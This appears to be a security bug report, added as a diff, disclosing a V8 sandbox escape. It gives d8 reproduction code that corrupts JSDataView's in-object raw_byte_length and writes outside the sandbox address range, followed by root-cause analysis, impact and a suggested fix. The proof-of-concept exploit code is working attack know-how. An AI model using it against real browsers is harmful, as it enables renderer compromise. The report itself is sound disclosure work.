@@ -1,0 +1,171 @@
+════════════════════════════════════════════════════════════════════
+ONE-LINE SUMMARY  (92 / 100 chars)
+════════════════════════════════════════════════════════════════════
+
+V8 sandbox escape via JSDataView raw_byte_length corruption enabling OOB write outside sandbox VA
+
+
+════════════════════════════════════════════════════════════════════
+STEPS TO REPRODUCE  (d8 v8.15.8.0, Linux x86-64)
+════════════════════════════════════════════════════════════════════
+
+Prerequisites
+-------------
+- Build d8 with the V8 Memory Corruption API enabled
+  (flag: v8_enable_memory_corruption_api = true)
+- Run flags: --expose-memory-corruption-api --allow-natives-syntax
+- The Sandbox.MemoryView API is used only as a faithful stand-in for
+  a real in-sandbox arbitrary write primitive (see Problem Description).
+  It does not weaken the analysis; every write in Stage 1 stays within
+  the first 4 GB of the sandbox heap.
+
+Step 1 — Establish in-sandbox arbitrary R/W primitive (simulated)
+------------------------------------------------------------------
+  const sv  = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+  const r32 = a => sv.getUint32(Number(a), true);
+  const w32 = (a, v) => sv.setUint32(Number(a), v >>> 0, true);
+
+  const SB_BASE = BigInt(Sandbox.base);
+  const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);  // SB_BASE + 1 TB
+
+This gives arbitrary read/write over the first 4 GB of the sandbox VA,
+which is the standard attacker capability the sandbox is designed to contain.
+
+Step 2 — Create a MemoryView whose backing store begins at SB_END − 4 GB
+-------------------------------------------------------------------------
+  const NEAR_END = Sandbox.byteLength - 0x100000000;  // 1 TB − 4 GB
+  const mv_end    = new Sandbox.MemoryView(NEAR_END, 0x100000000);
+  const mv_end_dv = new DataView(mv_end);
+
+  // Addresses of both objects in the compressed sandbox heap
+  const dvAddr = BigInt(Sandbox.getAddressOf(mv_end_dv));
+
+At this point:
+  backing_store(mv_end_dv) = SB_BASE + NEAR_END = SB_END − 4 GB
+  mv_end_dv.byteLength     = 4 GB   (exactly at the sandbox boundary)
+
+Step 3 — Corrupt JSDataView.raw_byte_length via in-sandbox write
+-----------------------------------------------------------------
+JSDataView stores its own raw_byte_length at in-object offset +0x24.
+Encoding: stored_value × 8 = JS byteLength  (verified empirically).
+
+  w32(dvAddr + 0x24n, 0xFFFFFFFF);
+
+Effect:
+  raw_byte_length field = 0xFFFFFFFF
+  mv_end_dv.byteLength  = 0xFFFFFFFF × 8 = 0x7FFFFFFF8 ≈ 34.4 GB
+
+No bounds check, sandbox integrity check, or EPT validation triggers.
+
+Step 4 — Write at offset 4 GB + 4, landing at SB_END + 4 (outside sandbox VA)
+--------------------------------------------------------------------------------
+  const OFFSET = 0x100000004;              // 4 GB + 4
+  // Effective address = backing_store + OFFSET
+  //                   = (SB_END − 4 GB) + (4 GB + 4)
+  //                   = SB_END + 4            ← outside [SB_BASE, SB_END)
+
+  mv_end_dv.setUint32(OFFSET, 0xDEADC0DE, true);
+
+Without a mapped page at SB_END the process faults with:
+  Received signal 11 SEGV_ACCERR <SB_END+4>
+
+The fault address is outside the sandbox VA reservation, confirming the
+write escaped the sandbox.  With a mapped page at SB_END (demonstrated
+by injecting mmap(SB_END, 4096, PROT_RW, MAP_FIXED) from GDB into the
+running d8 process), the write completes without a fault:
+
+  ✓ READ/WRITE OUTSIDE SANDBOX VA CONFIRMED
+  Address: 0x3bba00000004  outside [0x3aba00000000, 0x3bba00000000)
+  Read-back value: 0xdeadc0de
+
+Reproduce with the attached heap_escape_success.js + heap_escape_gdb.sh.
+
+
+════════════════════════════════════════════════════════════════════
+PROBLEM DESCRIPTION
+════════════════════════════════════════════════════════════════════
+
+Summary
+-------
+The V8 sandbox (SBX) is designed to contain an attacker who has already
+obtained an arbitrary read/write primitive within the sandbox VA reservation
+(a 1 TB region at a randomized base).  The EPT (ExternalPointerTable) and
+CodePointerTable protect externally-stored pointers so that such an attacker
+cannot read or forge raw native addresses stored in JS heap objects.
+
+However, JSDataView.raw_byte_length is stored at a fixed in-object offset
+(+0x24) INSIDE the sandbox heap, not through any external table.  An attacker
+who can write one DWORD to that offset can set byteLength to an arbitrary
+value up to 2^35 − 8 ≈ 34.4 GB.  When the DataView's backing store is
+positioned near SB_END, the inflated byteLength allows accesses to addresses
+beyond SB_END — outside the sandbox VA — breaking sandbox containment.
+
+Root cause
+----------
+JSDataView stores three length-related fields inside the sandbox heap:
+
+  Offset  Field               Encoding         Sandbox-protected?
+  ------  ------------------  ---------------  ------------------
+  +0x14   byte_offset         raw 32-bit int   NO  (in-sandbox)
+  +0x18   raw_byte_length *   field × 8        NO  (in-sandbox)   ← (ArrayBuffer)
+  +0x20   byte_length *       field × 8        NO  (in-sandbox)   ← (ArrayBuffer)
+  +0x24   raw_byte_length     field × 8        NO  (in-sandbox)   ← (DataView, THIS BUG)
+  +0x2c   data_pointer handle (via EPT)        YES (EPT-protected)
+
+  * JSArrayBuffer fields shown for reference; not exploited here.
+
+The backing_store (data) pointer goes through the EPT and cannot be forged.
+The byte_length field has no equivalent protection.  An attacker can inflate
+it to ~34 GB while the backing_store remains at a legitimate address.  The
+resulting DataView can then address the range:
+  [backing_store, backing_store + 34 GB)
+
+By placing backing_store at SB_END − 4 GB (the last valid aligned offset
+accepted by MemoryView), the accessible range becomes:
+  [SB_END − 4 GB,  SB_END + 30 GB)
+
+The region (SB_END, SB_END + 30 GB) is entirely outside the sandbox VA.
+
+Attack prerequisites
+--------------------
+1. An in-sandbox arbitrary write primitive at a known sandbox-relative
+   address.  This is the standard assumed attacker capability per the V8
+   sandbox threat model (Tier 2: in-sandbox memory corruption).  It is
+   commonly provided by exploiting an existing V8 bug such as a type
+   confusion, out-of-bounds write, or use-after-free in JIT-compiled code.
+
+2. No heap spray, no information leak, no ASLR bypass, and no second bug
+   are required.  The sandbox base and object addresses are obtained via
+   the Sandbox API (stand-in for a real info-leak or relative-write chain).
+
+Security impact
+---------------
+An attacker who chains this bug after an in-sandbox write achieves:
+
+  • Arbitrary write to native (non-sandbox) heap memory.
+  • Defeat of the V8 sandbox: objects in the native heap such as
+    code pointers, function tables, and OS handles are reachable.
+  • Potential for full renderer process code execution without
+    requiring a separate kernel bug when combined with existing
+    write-what-where capabilities in the native heap.
+
+The bug affects all platforms where the 1 TB V8 sandbox is active
+(64-bit desktop Chrome / Chromium).
+
+Suggested fix
+-------------
+Apply the same protection that backing_store pointers already receive:
+store raw_byte_length outside the sandbox heap (e.g., in a sandboxed
+integer slot with a range check on mutation), or validate that
+(byte_offset + byte_length) ≤ backing_buffer_byte_length before every
+TypedArray/DataView bounds check that uses the field.  An alternative is
+to sign or encode byte_length with a per-process secret (similar to
+pointer authentication), making it infeasible to forge a large value
+from within the sandbox.
+
+Verified on
+-----------
+  V8 version : 15.8.0 (candidate)
+  d8 binary  : custom build with v8_enable_memory_corruption_api=true
+  OS         : Linux x86-64 (kernel 6.18)
+  Sandbox    : 1 TB VA reservation, ASLR-randomized base
